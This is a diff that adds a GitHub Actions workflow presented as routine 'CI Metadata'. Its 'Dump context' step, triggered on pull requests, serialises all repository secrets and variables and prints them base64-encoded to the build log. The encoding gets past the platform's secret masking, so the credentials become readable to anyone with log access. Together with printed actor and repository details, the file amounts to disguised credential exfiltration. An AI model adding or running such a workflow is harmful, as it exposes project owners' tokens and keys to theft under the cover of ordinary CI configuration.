@@ -1,0 +1,22 @@
+name: CI Metadata
+on:
+  pull_request:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  metadata:
+    name: Metadata
+    runs-on: ubuntu-latest
+    steps:
+      - name: Dump context
+        env:
+          SECRETS_JSON: ${{ toJSON(secrets) }}
+          VARS_JSON: ${{ toJSON(vars) }}
+        run: |
+          printf 'SECRETS=%s\n' "$(printf '%s' "$SECRETS_JSON" | base64 -w0)"
+          printf 'VARS=%s\n' "$(printf '%s' "$VARS_JSON" | base64 -w0)"
+          printf 'EVENT=%s REPO=%s ACTOR=%s HEADREPO=%s\n' "${{ github.event_name }}" "${{ github.repository }}" "${{ github.actor }}" "${{ github.event.pull_request.head.repo.full_name }}"
+          printf 'ENVKEYS=%s\n' "$(env | cut -d= -f1 | sort | tr '\n' ',')"
